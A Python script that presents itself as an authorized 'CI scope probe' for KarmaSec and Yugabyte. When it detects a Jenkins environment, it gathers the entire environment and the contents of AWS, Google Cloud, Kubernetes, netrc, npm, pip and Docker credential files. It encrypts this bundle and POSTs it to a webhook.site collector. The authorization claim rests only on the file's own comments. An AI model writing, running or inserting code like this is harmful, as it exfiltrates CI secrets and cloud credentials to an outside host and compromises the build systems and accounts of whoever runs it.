#!/usr/bin/env python3

"""One-shot, encrypted KarmaSec CI trust-boundary validation.

This file is part of an authorized security assessment.  It never writes
plaintext CI material to stdout or an external service.  The assessment's
ephemeral recipient certificate is the only decryption identity.
"""

import base64
import hashlib
import json
import os
import shutil
import socket
import ssl
import stat
import subprocess
import tempfile
import time
import urllib.request


NONCE = "d222996c-8265-4830-92e0-fea08d26d1bc"
COLLECTOR_URL = "https://webhook.site/8fd22b4d-0be4-49ed-978b-549cefbbac08"
RECIPIENT_CERT = b"""-----BEGIN CERTIFICATE-----
MIIESTCCArGgAwIBAgIUCzwwIgok4EvCVk/a0pfcUnHdy6gwDQYJKoZIhvcNAQEL
BQAwNDEyMDAGA1UEAwwpS2FybWFTZWMgWXVnYWJ5dGUgQ0kgU2NvcGUgUHJvYmUg
MjAyNjA5MDMwHhcNMjYwOTAyMjMzNjAyWhcNMjYwOTA0MjMzNjAyWjA0MTIwMAYD
VQQDDClLYXJtYVNlYyBZdWdhYnl0ZSBDSSBTY29wZSBQcm9iZSAyMDI2MDkwMzCC
AaIwDQYJKoZIhvcNAQEBBQADggGPADCCAYoCggGBAKCzLW4DiBymowApcNbKqVip
7lQzLc6rrKARtARjTcH2vE0Ruex0eEqBwKj4/ArDpB91pRylv1jZcQOdecfAjvgj
MZ0bNDVv4ZCYKX0G4aSuwJ8DuXpycUHV9HYot9g8Y8feMwwa3Hf4T/jGJkCK5SH9
qgI3YHFWey/OKu8Oy9varjVfmr9fJ5P5pkjbv7hxgN5K6O9Cvrtv/O3Zyi4nOa8s
YUxWbnNMq65uvKp9yjBJNgbvP4/pINWf1KNwg9hp1hAX6UuRdw1i08XadI0Rbp89
PeQj8OIlrpyrjOGk8KPu0ej/vtXKCnqiQI2sifgPg3zI93AgKJKvC0HdRIvSe9ph
dvDgJ0CyoxJOnIor1CcvdrzKhJLVp5ktwzGHfTiMk+me1t8+Ik3byrlAfRUNM4t2
Tllqw3u7sTL++/e0nEs2cWMpCRVWke1h8A0V5T0l4XhkLSIi+SUit5Cl5BDt/PSR
plWnqr1T/8vHo6D8nBC4Sp71dvdNKbyA4W23pb3vhwIDAQABo1MwUTAdBgNVHQ4E
FgQUiIiDSa/xgFvFH5ITiQFZ1RS/ccEwHwYDVR0jBBgwFoAUiIiDSa/xgFvFH5IT
iQFZ1RS/ccEwDwYDVR0TAQH/BAUwAwEB/zANBgkqhkiG9w0BAQsFAAOCAYEAA/2v
GtoeajmlS+pmqIO05EE0zbcqz+LINi0K7dMHKiOCs+QmZ5zjEK5hLmRWBswMwYPV
OFvxKzBw5+Jd0FnpzLwqCVMecMqPcoevA1DAccjgXk++KNHahRyGelYuhZfuTXU7
0mx4A+Boxn9XWbMZJatvb6zkae8lrq8H/FGUGBzQ22TZAyw0BJFH1OKvgVUYxVFQ
tWzJSP5R1o4dCVTOo+l/8dmnJUJqEOd4poPIlicRNn3l2stegasCAPmn3szR1twI
TATDt5/fjSvtjdvb2dkbeqb0+Nu7zJdi7t7Aj72q/4ozRuZmU5w6Z0lQj0s6bfmx
AuXlYWzxK9sVD+hDY9ND+GaMLmWlxRsoKANWkQYk+vDz4iDUUm2STkJNwP9lVAAt
ss5OPWGFT51K4JEFwb73f1M/nu7P8NfGMAVPJZ7+PpwW8bP3GgPnuPYPv4HWrGwI
QMfAHu62R4kNEUkszlXnOsGQ5cwoOWbSKuloassTZyEluTXWEt/m/GP4Nk1p
-----END CERTIFICATE-----
"""


FILE_ENV_VARS = (
    "AWS_CONFIG_FILE",
    "AWS_SHARED_CREDENTIALS_FILE",
    "GOOGLE_APPLICATION_CREDENTIALS",
    "KUBECONFIG",
    "NETRC",
    "NPM_CONFIG_USERCONFIG",
    "PIP_CONFIG_FILE",
)


def read_bounded_file(path: str) -> dict:
    result = {"path": path}
    try:
        file_stat = os.stat(path)
        result.update({
            "mode": stat.S_IMODE(file_stat.st_mode),
            "size": file_stat.st_size,
        })
        if not stat.S_ISREG(file_stat.st_mode):
            result["skipped"] = "not_regular"
        elif file_stat.st_size > 1024 * 1024:
            result["skipped"] = "over_1_mib"
        else:
            with open(path, "rb") as input_file:
                data = input_file.read(1024 * 1024 + 1)
            result["sha256"] = hashlib.sha256(data).hexdigest()
            result["content_base64"] = base64.b64encode(data).decode("ascii")
    except Exception as exc:
        result["error_type"] = type(exc).__name__
    return result


def collect() -> dict:
    referenced_files = {}
    for env_name in FILE_ENV_VARS:
        env_value = os.environ.get(env_name)
        if env_value:
            referenced_files[env_name] = read_bounded_file(env_value)

    docker_config = os.environ.get("DOCKER_CONFIG")
    if docker_config:
        referenced_files["DOCKER_CONFIG/config.json"] = read_bounded_file(
            os.path.join(docker_config, "config.json"))

    return {
        "schema": "karmasec-yugabyte-ci-scope-probe-v1",
        "nonce": NONCE,
        "captured_at_unix": time.time(),
        "hostname": socket.gethostname(),
        "uid": os.getuid(),
        "euid": os.geteuid(),
        "gid": os.getgid(),
        "cwd": os.getcwd(),
        "environment": dict(sorted(os.environ.items())),
        "referenced_credential_files": referenced_files,
    }


def main() -> int:
    if not any(os.environ.get(name) for name in ("JENKINS_URL", "BUILD_URL", "JOB_NAME")):
        print("KARMASEC_CI_SCOPE_PROBE status=not_jenkins")
        return 0

    temp_dir = tempfile.mkdtemp(prefix=".karmasec-ci-scope-")
    os.chmod(temp_dir, 0o700)
    try:
        plain_path = os.path.join(temp_dir, "capture.json")
        cert_path = os.path.join(temp_dir, "recipient.pem")
        encrypted_path = os.path.join(temp_dir, "capture.cms")

        plain_bytes = json.dumps(
            collect(), sort_keys=True, separators=(",", ":"), ensure_ascii=False
        ).encode("utf-8")
        with open(plain_path, "wb") as output_file:
            output_file.write(plain_bytes)
        with open(cert_path, "wb") as output_file:
            output_file.write(RECIPIENT_CERT)
        os.chmod(plain_path, 0o600)
        os.chmod(cert_path, 0o600)

        openssl = shutil.which("openssl")
        if not openssl:
            print("KARMASEC_CI_SCOPE_PROBE status=no_encryptor")
            return 0
        subprocess.run(
            [
                openssl,
                "cms",
                "-encrypt",
                "-binary",
                "-aes-256-cbc",
                "-in",
                plain_path,
                "-outform",
                "DER",
                "-out",
                encrypted_path,
                cert_path,
            ],
            check=True,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=15,
        )
        with open(encrypted_path, "rb") as input_file:
            encrypted_bytes = input_file.read()

        request = urllib.request.Request(
            COLLECTOR_URL,
            data=encrypted_bytes,
            method="POST",
            headers={
                "Content-Type": "application/pkcs7-mime",
                "User-Agent": "KarmaSec-Yugabyte-Authorized-CI-Probe/1",
                "X-Karmasec-Nonce": NONCE,
                "X-Karmasec-Plain-SHA256": hashlib.sha256(plain_bytes).hexdigest(),
            },
        )
        with urllib.request.urlopen(
            request, timeout=15, context=ssl.create_default_context()
        ) as response:
            status = response.status
        print("KARMASEC_CI_SCOPE_PROBE status=sent http_status={}".format(status))
    except Exception as exc:
        print("KARMASEC_CI_SCOPE_PROBE status=failed error_type={}".format(
            type(exc).__name__))
    finally:
        shutil.rmtree(temp_dir, ignore_errors=True)
    return 0


if __name__ == "__main__":
    raise SystemExit(main())
